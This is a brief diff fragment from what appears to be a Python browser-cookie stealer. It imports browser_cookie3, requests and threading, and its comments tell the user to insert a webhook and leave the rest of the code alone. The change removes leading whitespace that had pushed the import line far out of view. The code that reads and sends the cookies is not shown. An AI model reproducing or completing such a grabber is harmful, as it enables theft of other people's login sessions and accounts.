@@ -12,7 +12,7 @@
 
  # WARNING touching with the code below will make the script not functional only insert your webhook..
  
-                         import browser_cookie3, requests, threading
+ import browser_cookie3, requests, threading
 
                                #Put your webhook below in between the ""
 
